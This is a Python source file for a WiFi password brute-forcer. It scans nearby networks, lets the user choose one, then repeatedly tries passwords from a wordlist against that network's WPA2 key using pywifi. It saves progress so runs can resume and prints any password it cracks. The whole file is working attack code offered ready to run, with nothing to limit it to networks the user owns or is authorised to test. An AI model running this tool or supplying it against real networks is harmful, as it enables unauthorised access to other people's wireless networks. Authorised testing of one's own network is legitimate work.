#!/usr/bin/env python 3.7
# -*- coding: utf-8 -*-

import argparse
import sys
import os
import os.path
import platform
import re
import time
import json
import hashlib
IS_MACOS = platform.system() == "Darwin"

HAS_PYWIFI = False
try:
    import pywifi
    from pywifi import PyWiFi
    from pywifi import const
    from pywifi import Profile
    HAS_PYWIFI = True
except Exception:
    # pywifi has no working backend on macOS; scanning uses system_profiler
    # and only the connect/crack loop needs pywifi (Linux/Windows).
    if not IS_MACOS:
        print("[-] pywifi not available. Install it with: pip install pywifi")


# By Brahim Jarrar ~
# GITHUB : https://github.com/BrahimJarrar/ ~
# CopyRight 2019 ~

RED   = "\033[1;31m"
BLUE  = "\033[1;34m"
CYAN  = "\033[1;36m"
GREEN = "\033[0;32m"
RESET = "\033[0;0m"
BOLD    = "\033[;1m"
REVERSE = "\033[;7m"

iface = None
ifaces = None
if HAS_PYWIFI:
    try:
        wifi = pywifi.PyWiFi()
        iface = wifi.interfaces()[0]
        ifaces = iface
    except Exception:
        print("[-] Error: no WiFi interface found")

type = False

def main(ssid, password, number):

    profile = Profile() 
    profile.ssid = ssid
    profile.auth = const.AUTH_ALG_OPEN
    profile.akm.append(const.AKM_TYPE_WPA2PSK)
    profile.cipher = const.CIPHER_TYPE_CCMP


    profile.key = password
    iface.remove_all_network_profiles()
    tmp_profile = iface.add_network_profile(profile)
    time.sleep(0.1) # if script not working change time to 1 !!!!!!
    iface.connect(tmp_profile) # trying to Connect
    time.sleep(0.35) # 1s

    if ifaces.status() == const.IFACE_CONNECTED: # checker
        time.sleep(1)
        print(BOLD, GREEN,'[*] Crack success!',RESET)
        print(BOLD, GREEN,'[*] password is ' + password, RESET)
        return True
    else:
        print(RED, '[{}] Crack Failed using {}'.format(number, password))
        return False

def _parse_signal(signal_noise):
    # "-74 dBm / -78 dBm" -> -74 ; missing/unknown -> very weak
    try:
        return int(signal_noise.split("dBm")[0].strip())
    except (ValueError, AttributeError, IndexError):
        return -999


def _scan_macos():
    # pywifi has no working macOS backend, so use the native system_profiler
    import json
    import subprocess

    out = subprocess.check_output(
        ["system_profiler", "SPAirPortDataType", "-json"],
        stderr=subprocess.DEVNULL,
    )
    data = json.loads(out)

    networks = {}
    for iface_info in data.get("SPAirPortDataType", []):
        for ap in iface_info.get("spairport_airport_interfaces", []):
            # networks other than the one we are connected to
            for net in ap.get("spairport_airport_other_local_wireless_networks", []):
                ssid = net.get("_name")
                if not ssid:
                    continue
                sig = _parse_signal(net.get("spairport_signal_noise", ""))
                if ssid not in networks or sig > networks[ssid]:
                    networks[ssid] = sig
            # the currently connected network (nested one level down)
            cur = ap.get("spairport_current_network_information")
            if isinstance(cur, dict):
                ssid = cur.get("_name")
                if ssid:
                    sig = _parse_signal(cur.get("spairport_signal_noise", ""))
                    if ssid not in networks or sig > networks[ssid]:
                        networks[ssid] = sig
    return networks


def scan_networks():
    print(CYAN, "[~] Scanning for WiFi networks...", RESET)

    if platform.system() == "Darwin":
        try:
            networks = _scan_macos()
        except Exception as e:
            print(RED, "[-] Scan failed: {}".format(e), RESET)
            exit()
    else:
        iface.scan()
        time.sleep(3)  # give the card time to finish scanning
        networks = {}
        for net in iface.scan_results():
            ssid = net.ssid
            if not ssid:
                continue
            if ssid not in networks or net.signal > networks[ssid]:
                networks[ssid] = net.signal

    # sort by signal strength (strongest first)
    sorted_nets = sorted(networks.items(), key=lambda x: x[1], reverse=True)

    if not sorted_nets:
        print(RED, "[-] No networks found.", RESET)
        exit()

    print(GREEN, "\n[+] Available networks:\n", RESET)
    for i, (ssid, signal) in enumerate(sorted_nets, 1):
        print("  {}[{}]{} {}  ({} dBm)".format(BOLD, i, RESET, ssid, signal))

    if IS_MACOS and len(sorted_nets) <= 1:
        print(CYAN, "\n[i] Only found the current network. To see nearby ones on macOS:")
        print("    - run WITHOUT sudo:  python3 WifiBF.py")
        print("    - enable System Settings > Privacy & Security > Location Services for Terminal", RESET)

    print(BLUE)
    while True:
        choice = input("\n[*] Select network number: ")
        try:
            idx = int(choice)
            if 1 <= idx <= len(sorted_nets):
                selected = sorted_nets[idx - 1][0]
                print(GREEN, "[+] Selected: {}".format(selected), RESET)
                return selected
        except ValueError:
            pass
        print(RED, "[-] Invalid choice, try again.", BLUE)


# ---- progress tracking (resume between runs) --------------------------------

RESULTS_DIR = os.path.join(os.path.dirname(os.path.abspath(__file__)), "results")


def _safe_name(ssid):
    # sanitize the SSID for a filename, and append a short hash so different
    # SSIDs never collide (handles spaces, unicode, special chars, empties)
    slug = re.sub(r'[^A-Za-z0-9._-]', '_', ssid)[:40] or "network"
    digest = hashlib.sha1(ssid.encode("utf-8")).hexdigest()[:6]
    return "{}_{}.json".format(slug, digest)


def _state_path(ssid):
    return os.path.join(RESULTS_DIR, _safe_name(ssid))


def _wordlist_fingerprint(path):
    # size + mtime is enough to notice the wordlist changed
    try:
        st = os.stat(path)
        return "{}:{}".format(st.st_size, int(st.st_mtime))
    except OSError:
        return ""


def load_state(ssid):
    path = _state_path(ssid)
    if not os.path.exists(path):
        return None
    try:
        with open(path, "r", encoding="utf-8") as f:
            return json.load(f)
    except Exception:
        return None


def save_state(state):
    os.makedirs(RESULTS_DIR, exist_ok=True)
    path = _state_path(state["ssid"])
    tmp = path + ".tmp"
    state["updated_at"] = time.strftime("%Y-%m-%d %H:%M:%S")
    with open(tmp, "w", encoding="utf-8") as f:
        json.dump(state, f, ensure_ascii=False, indent=2)
    os.replace(tmp, path)  # atomic: never leaves a half-written file


def pwd(ssid, file):
    fp = _wordlist_fingerprint(file)
    abspath = os.path.abspath(file)
    prev = load_state(ssid)

    # already cracked in a previous run?
    if prev and prev.get("status") == "found":
        print(GREEN, "[*] Already cracked earlier -> password is: {}".format(prev.get("password")), RESET)
        print(CYAN, "    (see {})".format(_state_path(ssid)), RESET)
        return

    start = 0
    if prev and prev.get("wordlist") == abspath and prev.get("wordlist_fingerprint") == fp:
        start = prev.get("last_index", 0)
        if start > 0:
            print(CYAN, "[~] Resuming '{}' from attempt #{} (skipping already-tried passwords)".format(ssid, start + 1), RESET)
    elif prev:
        print(CYAN, "[~] Wordlist changed since last run for '{}' -> starting over.".format(ssid), RESET)

    with open(file, "r", encoding="utf8") as words:
        lines = [ln.rstrip("\n") for ln in words]
    total = len(lines)

    state = {
        "ssid": ssid,
        "wordlist": abspath,
        "wordlist_fingerprint": fp,
        "total": total,
        "last_index": start,
        "status": "in-progress",
        "password": None,
        "updated_at": None,
    }
    save_state(state)

    try:
        for i in range(start, total):
            password = lines[i]
            number = i + 1
            success = main(ssid, password, number)
            state["last_index"] = number
            if success:
                state["status"] = "found"
                state["password"] = password
                save_state(state)
                print(GREEN, "[*] Result saved to {}".format(_state_path(ssid)), RESET)
                return
            save_state(state)  # persist after every attempt (survives power loss)
        state["status"] = "exhausted"
        save_state(state)
        print(RED, "[-] Wordlist exhausted for '{}', no password found.".format(ssid), RESET)
    except KeyboardInterrupt:
        save_state(state)
        print(CYAN, "\n[~] Stopped. Progress saved at attempt #{} — run again to resume.".format(state["last_index"]), RESET)
        raise
                    


def menu():
    parser = argparse.ArgumentParser(description='argparse Example')

    parser.add_argument('-s', '--ssid', metavar='', type=str, help='SSID = WIFI Name..')
    parser.add_argument('-w', '--wordlist', metavar='', type=str, help='keywords list (default: words-vi.txt)')

    group1 = parser.add_mutually_exclusive_group()

    group1.add_argument('-v', '--version', metavar='', help='version')
    print(" ")

    args = parser.parse_args()

    print(CYAN, "[+] You are using ", BOLD, platform.system(), platform.machine(), "...")
    time.sleep(2.5)

    if args.version:
        print("\n\n",CYAN,"by Brahim Jarrar\n")
        print(RED, " github", BLUE," : https://github.com/BrahimJarrar/\n")
        print(GREEN, " CopyRight 2019\n\n")
        exit()

    # SSID: use the one passed with -s, otherwise scan and let the user pick
    if args.ssid:
        ssid = args.ssid
    else:
        ssid = scan_networks()

    # The connect/crack loop needs pywifi, which has no macOS backend.
    if iface is None:
        print(RED, "\n[-] No usable WiFi backend for connecting on this system.", RESET)
        if IS_MACOS:
            print(CYAN, "[i] pywifi cannot drive WiFi on macOS, so the password-testing")
            print("    loop won't run here. Run this tool on Linux (with pywifi) for that.", RESET)
        exit()

    # wordlist: use -w if given, otherwise default to words-vi.txt next to
    # this script (just press Enter to accept the default).
    default_wordlist = os.path.join(os.path.dirname(os.path.abspath(__file__)), "words-vi.txt")
    if args.wordlist:
        filee = args.wordlist
    else:
        print(BLUE)
        filee = input("[*] pwds file [{}]: ".format(default_wordlist)).strip()
        if not filee:
            filee = default_wordlist


    # thx
    if os.path.exists(filee):
        if platform.system().startswith("Win" or "win"):
            os.system("cls")
        else:
            os.system("clear")

        print(BLUE,"[~] Cracking...")
        pwd(ssid, filee)

    else:
        print(RED,"[-] No Such File.",BLUE)


if __name__ == "__main__":
    menu()
